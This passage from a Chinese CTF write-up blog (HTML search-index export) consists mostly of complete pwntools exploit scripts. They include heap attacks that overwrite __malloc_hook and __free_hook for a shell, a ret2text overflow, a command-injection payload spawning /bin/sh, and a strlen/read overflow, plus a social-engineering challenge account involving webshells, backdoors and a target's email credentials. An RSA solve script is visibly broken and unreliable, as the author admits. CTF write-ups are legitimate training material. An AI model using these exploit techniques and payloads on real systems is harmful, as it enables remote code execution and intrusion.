class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your remarks:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    fillInfo(name, say, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_info</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line">free(-<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(og[<span class="number">3</span>] + libc_base))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="card"><a href="#card" class="headerlink" title="card"></a>card</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="https://i.loli.net/2021/06/05/UPpgt2VXkEof6iz.png" alt=""><br>漏洞点在于这个地方，edit的时候直接用size就好了，这里偏偏加了一个v1，明显是有漏洞，然后我们进入overflow函数看看</p><p><img src="https://i.loli.net/2021/06/05/ca6LgQMpY1GUyAS.png" alt=""><br>进行了一些列蜜汁操作，看不懂问题不大，反正就是这么个逻辑，这个函数的返回值加上size作为edit的size，那么只要这个函数的返回值是1，那么就相当于溢出了一个字节呗</p><p>写个脚本来看看，直接用那个overflow的逻辑，稍微改改就行了，如果返回值不是0，那么就输出，看看哪些size是可用的<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">    <span class="keyword">if</span> ((((((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>) + i) &amp; <span class="number">0xF</span>) - ((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &gt;&gt; <span class="number">3</span>):</span><br><span class="line">        size.append(<span class="built_in">hex</span>(i))</span><br><span class="line">print(<span class="built_in">len</span>(size))</span><br><span class="line">print(size)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2021/06/05/BZgo3sP8ThXI5Nb.png" alt=""></p><p>那就直接用0x?8的地址就可以了<br>所以这道题就转变为了libc-2.27下的off-by-one<br>（libc版本为GLIBC 2.27-3ubuntu1，尚无key机制，不过这道题好像也无需关心这一点）</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so&#x27;</span></span><br><span class="line">port = <span class="number">29844</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Infuse power:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;quickly!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;start your bomb show&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">289</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE =====&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x70</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>) </span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x90</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xf0</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x68</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">5</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">&quot;HACKER&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;0x8&#x27;, &#x27;0x9&#x27;, &#x27;0xa&#x27;, &#x27;0xb&#x27;, &#x27;0xc&#x27;, &#x27;0xd&#x27;, &#x27;0xe&#x27;, &#x27;0xf&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x18&#x27;, &#x27;0x19&#x27;, &#x27;0x1a&#x27;, &#x27;0x1b&#x27;, &#x27;0x1c&#x27;, &#x27;0x1d&#x27;, &#x27;0x1e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x1f&#x27;, &#x27;0x28&#x27;, &#x27;0x29&#x27;, &#x27;0x2a&#x27;, &#x27;0x2b&#x27;, &#x27;0x2c&#x27;, &#x27;0x2d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x2e&#x27;, &#x27;0x2f&#x27;, &#x27;0x38&#x27;, &#x27;0x39&#x27;, &#x27;0x3a&#x27;, &#x27;0x3b&#x27;, &#x27;0x3c&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x3d&#x27;, &#x27;0x3e&#x27;, &#x27;0x3f&#x27;, &#x27;0x48&#x27;, &#x27;0x49&#x27;, &#x27;0x4a&#x27;, &#x27;0x4b&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x4c&#x27;, &#x27;0x4d&#x27;, &#x27;0x4e&#x27;, &#x27;0x4f&#x27;, &#x27;0x58&#x27;, &#x27;0x59&#x27;, &#x27;0x5a&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x5b&#x27;, &#x27;0x5c&#x27;, &#x27;0x5d&#x27;, &#x27;0x5e&#x27;, &#x27;0x5f&#x27;, &#x27;0x68&#x27;, &#x27;0x69&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x6a&#x27;, &#x27;0x6b&#x27;, &#x27;0x6c&#x27;, &#x27;0x6d&#x27;, &#x27;0x6e&#x27;, &#x27;0x6f&#x27;, &#x27;0x78&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x79&#x27;, &#x27;0x7a&#x27;, &#x27;0x7b&#x27;, &#x27;0x7c&#x27;, &#x27;0x7d&#x27;, &#x27;0x7e&#x27;, &#x27;0x7f&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x88&#x27;, &#x27;0x89&#x27;, &#x27;0x8a&#x27;, &#x27;0x8b&#x27;, &#x27;0x8c&#x27;, &#x27;0x8d&#x27;, &#x27;0x8e&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x8f&#x27;, &#x27;0x98&#x27;, &#x27;0x99&#x27;, &#x27;0x9a&#x27;, &#x27;0x9b&#x27;, &#x27;0x9c&#x27;, &#x27;0x9d&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0x9e&#x27;, &#x27;0x9f&#x27;, &#x27;0xa8&#x27;, &#x27;0xa9&#x27;, &#x27;0xaa&#x27;, &#x27;0xab&#x27;, &#x27;0xac&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xad&#x27;, &#x27;0xae&#x27;, &#x27;0xaf&#x27;, &#x27;0xb8&#x27;, &#x27;0xb9&#x27;, &#x27;0xba&#x27;, &#x27;0xbb&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xbc&#x27;, &#x27;0xbd&#x27;, &#x27;0xbe&#x27;, &#x27;0xbf&#x27;, &#x27;0xc8&#x27;, &#x27;0xc9&#x27;, &#x27;0xca&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xcb&#x27;, &#x27;0xcc&#x27;, &#x27;0xcd&#x27;, &#x27;0xce&#x27;, &#x27;0xcf&#x27;, &#x27;0xd8&#x27;, &#x27;0xd9&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xda&#x27;, &#x27;0xdb&#x27;, &#x27;0xdc&#x27;, &#x27;0xdd&#x27;, &#x27;0xde&#x27;, &#x27;0xdf&#x27;, &#x27;0xe8&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xe9&#x27;, &#x27;0xea&#x27;, &#x27;0xeb&#x27;, &#x27;0xec&#x27;, &#x27;0xed&#x27;, &#x27;0xee&#x27;, &#x27;0xef&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xf8&#x27;, &#x27;0xf9&#x27;, &#x27;0xfa&#x27;, &#x27;0xfb&#x27;, &#x27;0xfc&#x27;, &#x27;0xfd&#x27;, &#x27;0xfe&#x27;, </span></span><br><span class="line"><span class="string">&#x27;0xff&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMPWN</title>
      <link href="2021/05/30/VMPWN/"/>
      <url>2021/05/30/VMPWN/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> VMpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JlenuCTF</title>
      <link href="2021/05/23/JlenuCTF/"/>
      <url>2021/05/23/JlenuCTF/</url>
      
        <content type="html"><![CDATA[<p>反正交完wp了，索性水个博客吧（</p><h2 id="HAPPYGAME"><a href="#HAPPYGAME" class="headerlink" title="HAPPYGAME"></a>HAPPYGAME</h2><h3 id="SIMPIOT"><a href="#SIMPIOT" class="headerlink" title="SIMPIOT"></a>SIMPIOT</h3><p>到手后直接strings一波，啊这</p><p><img src="https://i.loli.net/2021/05/22/KxLRHa4nw7hP8rY.png" alt=""></p><h3 id="社工一：帮我溯源"><a href="#社工一：帮我溯源" class="headerlink" title="社工一：帮我溯源"></a>社工一：帮我溯源</h3><p>我愿称为最强题目，雪宝yyds</p><p>👴🏻一开始不知道怎么回事，下载下来www.zip是这样的，莫不是👴🏻被搅屎了，浪费了👴🏻一个半小时看日志文件，然后还真给👴🏻查出个威胁情报ip来</p><p><img src="https://i.loli.net/2021/05/22/LHRF74sqPt3TV9D.png" alt=""></p><p><img src="https://i.loli.net/2021/05/22/KNnSZ8rAUVWqfPc.png" alt=""></p><p>后来👴🏻测了一堆无用功，找了一些日志审计脚本和手写正则的脚本，发现啥都查不到，👴🏻傻了，👴🏻寻思happygame给👴🏻整不happy了，👴🏻很气愤，👴🏻去睡觉了</p><p>👴🏻第二天越想越气，👴🏻决定再来做一做，👴🏻重新下载www.zip，👴🏻傻了，竟然是网站源码，****</p><p>好了，开始审计，rips给👴🏻扫</p><p><img src="https://i.loli.net/2021/05/23/qvtuL1K3yZToQCB.png" alt=""></p><p>扫出来木马了，👴🏻直接连shell，然后hacked by HSYM</p><h3 id="社工二：深入调查"><a href="#社工二：深入调查" class="headerlink" title="社工二：深入调查"></a>社工二：深入调查</h3><p><img src="https://i.loli.net/2021/05/23/2dEKNoIMWHhtbGf.png" style="zoom:50%;" /></p><p>审日志，ip到手</p><h3 id="社工三：信息收集"><a href="#社工三：信息收集" class="headerlink" title="社工三：信息收集"></a>社工三：信息收集</h3><p>访问带黑客的网站，发现扣扣号，找到他的生日了，有hint，博客后台是id+生日</p><p><img src="https://i.loli.net/2021/05/23/JYo1FjGAEbpklhi.png" alt=""></p><p>然后就可以进带黑客的后台了</p><h3 id="社工四：反击黑客"><a href="#社工四：反击黑客" class="headerlink" title="社工四：反击黑客"></a>社工四：反击黑客</h3><p>这个👴🏻没有做出来，但是👴🏻不知道哪里不对，先记录一下8</p><p>进了后台，用msf连接shell不就行了</p><p>然后找到了这个udf.php，有不会修电脑师傅留下的后门，这不直接拿来用一波</p><p>然后尝试查看backup发现disable_function给ban了好多system之类的东西，算了，再看看别的目录</p><p>然后发现了这个</p><p><img src="https://i.loli.net/2021/05/23/klZN8cqTEMKp2Qg.png" style="zoom:50%;" /></p><p>芜湖，然后邮箱密码就拿到了，用带黑客的ProtonMail邮箱登进去，发现坚果云2333</p><p><img src="https://i.loli.net/2021/05/23/pxSX9ogACfr5BY1.png" style="zoom:50%;" /></p><p>发现带黑客的身份证，那按理来说黑客就住在下北泽？但是flag不对</p><p><img src="https://i.loli.net/2021/05/23/QXrWPYkZ62uTCNs.png" style="zoom:50%;" /></p><p>所以👴🏻百度百科查到了下北泽的各种叫法和下北泽在日本的具体位置，都不对，算了，不做了，补作业去了（x</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>直接在console里调用js代码即可弹出flag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>简单的盲文，找个在线解密的一把梭就好了</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>虽然没有做出来，但是感觉思路没问题，先填个坑，不知道中间哪一步错了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先给了d，解出来pq，然后加密的时候又把e换成了7</p><p>但是解的时候解不出来，不知道哪里错了，orz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>签到题，ret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>有web内味了，尝试用单引号和分号闭合，payload是试出来的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>漏洞点在于strlen读取的长度可以被00截断，但是read的返回值不可以，溢出就完事了嗷</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" 